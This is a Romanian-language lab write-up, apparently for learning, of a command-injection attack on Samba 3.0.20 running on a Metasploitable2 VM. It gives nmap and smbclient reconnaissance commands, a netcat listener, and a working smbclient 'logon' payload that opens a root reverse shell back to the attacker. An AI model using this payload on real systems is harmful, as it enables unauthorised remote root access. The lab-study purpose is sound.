### Atac SMB:
  
  - [Despre SMB](https://github.com/Dani780-C/Cyber-security/blob/main/learn/_smb.md)
  - versiune: *Samba 3.0.20*
  - Pasii atacului:
               
         nmap -sSV 192.168.56.102 -p139,445
         
    ![My Image](https://github.com/Dani780-C/Cyber-security/blob/main/attacks/imgs/nmap-scan-samba.png)

    Pentru a descoperi versiunea finala a serviciului, putem folosi tool-ul [smbclient](https://github.com/Dani780-C/Cyber-security/blob/main/tools/smbclient.md).
        
         smbclient -L 192.168.56.102 -p 445
         
    Dupa executarea comenzii, clientul este intrebat de o parola. Se apasa ENTER.
     
    ![My Image](https://github.com/Dani780-C/Cyber-security/blob/main/attacks/imgs/samba-version.png)

    Problema cu aceasta versiune samba 3.0.20 apare la etapa de login a clientului. Prin folosirea [metacaracterelor](https://github.com/Dani780-C/Cyber-security/blob/main/learn/metacaractere.md) putem sa scapam de partea de login a username-ului si sa executam comenzi (command injection).  
    
    Inainte de toate, trebuie sa avem un listener pe un anumit port pentru conexiuni exterioare. Intr-un terminal separat vom executa un netcat pentru a asculta pe portul 4444 orice conexiune: `nc -lvp 4444`.  
    In alt terminal, vom folosi smbclient pentru a ne conecta la serverul remote Metasploitable2: `smbclient //metasploitable/tmp`. Acum vine partea de autentificare in care vom apasa ENTER pentru a folosi command interface-ul smbclient.  
    Comanda `logon` din smbclient ne va ajuta sa omitem partea de autentificare injectand o comanda ce ne va efectua un reverse shell pe portul 4444 ascultat de `netcat`: ``logon "/=`nc 192.168.56.101 4444 -e /bin/bash`"``.  
    Se poate vedea ca atacul a reusit si folosim contul de root.
    
    ![My Image](https://github.com/Dani780-C/Cyber-security/blob/main/attacks/imgs/smbclient-logon-metacaractere.png)
    
  - Analiza trafic:
      - [Captura traficului pentru serviciul Samba in timpul atacului](https://github.com/Dani780-C/Cyber-security/blob/main/captures/samba-traffic-while-attack.pcapng)
